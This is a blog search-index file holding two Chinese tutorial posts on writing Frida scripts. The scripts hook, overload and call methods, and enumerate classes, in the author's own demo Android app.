<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Frida学习(二)</title>
      <link href="/2024/04/15/Frida%E5%AD%A6%E4%B9%A0(%E4%BA%8C)/"/>
      <url>/2024/04/15/Frida%E5%AD%A6%E4%B9%A0(%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<p>这篇文章用来记录Frida在Hook各种方法时的脚本编写。</p><span id="more"></span><p>测试源码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.lesson4one;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> m;</span><br><span class="line">            m = fun(<span class="number">50</span>, <span class="number">80</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">fun</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span>&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;e1ectr0nlc&quot;</span>, String.valueOf(x + y));</span><br><span class="line">        <span class="keyword">return</span> x + y;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>控制台运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -l xxx.js com.example.lesson4one</span><br></pre></td></tr></table></figure><h2 id="Hook调用的方法"><a href="#Hook调用的方法" class="headerlink" title="Hook调用的方法"></a>Hook调用的方法</h2><p> 使用Frida获取到调用的fun（）函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.lesson4one.MainActivity&quot;</span>).<span class="property">fun</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">arg1,arg2</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">fun</span>(arg1,arg2);<span class="comment">//或者这里将参数改为两个整数例如（48，56）</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arg1, arg2, result&quot;</span>, arg1, arg2, result);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p><img src="https://p.sda1.dev/17/dc626de619df002439662069d220c339/image.png" class="lazyload" data-srcset="https://p.sda1.dev/17/dc626de619df002439662069d220c339/image.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"></p><h2 id="Hook重载的方法"><a href="#Hook重载的方法" class="headerlink" title="Hook重载的方法"></a>Hook重载的方法</h2><p>更改源码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.lesson4one;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">total</span> <span class="operator">=</span> <span class="string">&quot;@@@@####@@@@&quot;</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> fun(<span class="number">50</span>,<span class="number">80</span>);</span><br><span class="line">            Log.d(<span class="string">&quot;e1ectr0nlc m = &quot;</span>, String.valueOf(m));</span><br><span class="line">            Log.d(<span class="string">&quot;e1ectr0nlc tolowercase&quot;</span>, fun(<span class="string">&quot;LOWERCASEME!&quot;</span>));</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">String <span class="title function_">fun</span><span class="params">(String x )</span>&#123;</span><br><span class="line">    total +=x ;</span><br><span class="line">    <span class="keyword">return</span> x.toLowerCase();<span class="comment">//大写改小写</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> <span class="title function_">fun</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span>&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;e1ectr0nlc&quot;</span>, String.valueOf(x + y));</span><br><span class="line">        <span class="keyword">return</span> x + y;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JS脚本如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123; </span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.lesson4one.MainActivity&quot;</span>).<span class="property">fun</span>.<span class="title function_">overload</span>(<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">arg1, arg2</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">fun</span>(<span class="number">100</span>, <span class="number">200</span>);    <span class="comment">// 更改参数</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new()));<span class="comment">// 打印调用栈,不需要的话可以注释掉。</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arg1, arg2, result&quot;</span>, arg1, arg2, result);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;    </span><br><span class="line">       <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.lesson4one.MainActivity&quot;</span>).<span class="property">fun</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">arg1 </span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">fun</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(<span class="string">&quot;NIHAOJAVA&quot;</span>));</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arg1,result&quot;</span>,arg1,result)</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">            <span class="comment">//return Java.use(&#x27;java.lang.String&#x27;).$new(&quot;NIHAOJS&quot;);直接更改返回值 </span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p>打印结果如下</p><p><img src="https://p.sda1.dev/17/7ac4dd4b9da26cc8d96512e9e099ef03/image.png" class="lazyload" data-srcset="https://p.sda1.dev/17/7ac4dd4b9da26cc8d96512e9e099ef03/image.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"></p><p>同时App内的日志信息也会改变</p><p><img src="https://p.sda1.dev/17/853fe114e0dc684c2c3f8d9488471ee7/image.png" class="lazyload" data-srcset="https://p.sda1.dev/17/853fe114e0dc684c2c3f8d9488471ee7/image.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"></p><h2 id="Hook未调用的方法"><a href="#Hook未调用的方法" class="headerlink" title="Hook未调用的方法"></a>Hook未调用的方法</h2><p>在源码中添加一个没有调用过的函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//添加函数但不调用</span></span><br><span class="line">String <span class="title function_">secret</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> total;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>脚本代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.example.lesson4one.MainActivity&quot;</span>,&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found instance :&quot;</span>,instance)</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found instance :&quot;</span>,instance.<span class="title function_">secret</span>())</span><br><span class="line">            &#125;,<span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p><img src="https://p.sda1.dev/17/70183c4696997d62208d8418cb785a60/image.png" class="lazyload" data-srcset="https://p.sda1.dev/17/70183c4696997d62208d8418cb785a60/image.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"></p><h2 id="Hook未调用的静态方法"><a href="#Hook未调用的静态方法" class="headerlink" title="Hook未调用的静态方法"></a>Hook未调用的静态方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//测试代码中添加未调用的静态方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">secret2</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> total;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>Hook脚本</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> result = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.lesson4one.MainActivity&quot;</span>).<span class="title function_">secret2</span>();</span><br><span class="line">       <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p><img src="https://p.sda1.dev/17/48294e6fe775fc30e13d887c47d39830/image.png" class="lazyload" data-srcset="https://p.sda1.dev/17/48294e6fe775fc30e13d887c47d39830/image.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"></p><p>总的测试代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.lesson4one;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">total</span> <span class="operator">=</span> <span class="string">&quot;@@@@####@@@@&quot;</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> fun(<span class="number">50</span>,<span class="number">80</span>);</span><br><span class="line">            Log.d(<span class="string">&quot;e1ectr0nlc m = &quot;</span>, String.valueOf(m));</span><br><span class="line">            Log.d(<span class="string">&quot;e1ectr0nlc tolowercase&quot;</span>, fun(<span class="string">&quot;LOWERCASEME!&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    String <span class="title function_">fun</span><span class="params">(String x )</span>&#123;</span><br><span class="line">        total +=x ;</span><br><span class="line">        <span class="keyword">return</span> x.toLowerCase();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">fun</span><span class="params">(<span class="type">int</span> x ,<span class="type">int</span> y)</span>&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;e1ectr0nlc&quot;</span>, String.valueOf((x+y)));</span><br><span class="line">        <span class="keyword">return</span> x+y;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    String <span class="title function_">secret</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> total;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">secret2</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> total;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Hook框架 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Frida学习(一)</title>
      <link href="/2024/04/12/Frida%E5%AD%A6%E4%B9%A0(%E4%B8%80)/"/>
      <url>/2024/04/12/Frida%E5%AD%A6%E4%B9%A0(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<p>学习Frida脚本的编写</p><span id="more"></span><h2 id="Frida脚本的概念"><a href="#Frida脚本的概念" class="headerlink" title="Frida脚本的概念"></a>Frida脚本的概念</h2><p><code>FRIDA脚本</code>就是利用<code>FRIDA</code>动态插桩框架，使用<code>FRIDA</code>导出的<code>API</code>和方法，对内存空间里的对象方法进行监视、修改或者替换的一段代码。<code>FRIDA</code>的<code>API</code>是使用<code>JavaScript</code>实现的，所以我们可以充分利用<code>JS</code>的匿名函数的优势、以及大量的<code>hook</code>和回调函数的API。如果不了解匿名函数，可以先简单了解一下，相信对你编写Frida脚本会有帮助。</p><p>举一个最简单的例子</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line"> <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line"> &#125;)</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p>这段代码的作用是在 Android 应用程序的 Java 虚拟机中执行一个函数，该函数将在 Frida 控制台输出 <code>&quot;hello world&quot;。</code></p><p>控制台运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -l hello-world.js android.process.media</span><br></pre></td></tr></table></figure><p>“-U”表示使用USB连接到设备，而不是通过网络连接；”-l”表示指定要加载的JavaScript脚本文件；”android.process.media”是目标进程的名称</p><p><img src="https://s2.loli.net/2024/04/16/EFZTULnR42bAlO1.png" class="lazyload" data-srcset="https://s2.loli.net/2024/04/16/EFZTULnR42bAlO1.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240416220253422"></p><p>解释一下这段代码，</p><ul><li>首先是<code>function main() &#123; ... &#125;</code>是javascript中定义函数的语法，函数名为main。</li><li><code>Java.perform(function() &#123; ... &#125;);</code>是Frida中的一个重要函数，它接受一个函数作为参数，在被Frida Hook的Java虚拟机中执行。在这个函数内部，可以使用Frida提供的API接口来进行动态分析、修改、拦截等操作。</li><li><code>console.log(&quot;hello world&quot;);</code>: 这是 JavaScript 中的输出语句，用于在 Frida 控制台输出信息。在这里，它将输出字符串 “hello world</li><li><code>setImmediate(main)</code>: 这是 JavaScript 中的一个函数，用于在当前 JavaScript 事件循环的下一个循环迭代中执行指定的函数。在这里，它用于在当前 JavaScript 执行栈结束后立即调用 <code>main</code> 函数。</li></ul><h2 id="进阶操作"><a href="#进阶操作" class="headerlink" title="进阶操作"></a>进阶操作</h2><p>了解了Frida如何进行基本的使用，接下来就可以尝试使用一些API函数进行操作。</p><p><a href="https://www.frida.re/docs/javascript-api/#java">FRIDA的API手册</a></p><h3 id="枚举所有加载的类"><a href="#枚举所有加载的类" class="headerlink" title="枚举所有加载的类"></a>枚举所有加载的类</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line"> <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[*] enumerating classes...&quot;</span>);</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;</span><br><span class="line">      <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">_className</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] found instance of &#x27;&quot;</span>+_className+<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] class enuemration complete&quot;</span>);</span><br><span class="line"> &#125;)</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p>保存并执行</p><p>可以得到如下结果</p><p><img src="https://p.sda1.dev/17/97fda883691067f68ca37851dcb5ea58/image.png" class="lazyload" data-srcset="https://p.sda1.dev/17/97fda883691067f68ca37851dcb5ea58/image.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"></p><p>太多了只截取了最后一段</p><p>解释一下这段代码：</p><ul><li><code>Java.enumerateLoadedClasses(&#123; ... &#125;)</code>: 这是 Frida 提供的一个方法，用于枚举当前已加载的所有类。它接受一个 JavaScript 对象作为参数，该对象包含两个属性：<code>onMatch</code> 和 <code>onComplete</code></li><li><code>onMatch: function(_className) &#123; ... &#125;</code>: 这是一个回调函数，用于处理每个匹配到的类名。在每次找到一个类名时，这个函数会被调用。在这个函数中，类名存储在 <code>_className</code> 参数中，并通过 <code>console.log</code> 输出到 Frida 控制台</li><li><code>onComplete: function() &#123; ... &#125;</code>: 这也是一个回调函数，当所有类都被枚举完毕时调用。在这个函数中，通过 <code>console.log</code> 输出一条消息表示类枚举过程完成</li></ul><h3 id="定位目标类"><a href="#定位目标类" class="headerlink" title="定位目标类"></a>定位目标类</h3><p>我们既然可以获取到加载的所有类，也可以获取指定类。假如我们需要获取有关蓝牙的某个类，代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">       <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;</span><br><span class="line">    <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">         <span class="keyword">if</span> (instance.<span class="title function_">split</span>(<span class="string">&quot;.&quot;</span>)[<span class="number">1</span>] == <span class="string">&quot;bluetooth&quot;</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[-&gt;]\t&quot;</span>+instance);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] class enuemration complete&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p><img src="https://p.sda1.dev/17/3715e773979e2e5d3f7c8cff155a3220/image.png" class="lazyload" data-srcset="https://p.sda1.dev/17/3715e773979e2e5d3f7c8cff155a3220/image.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" 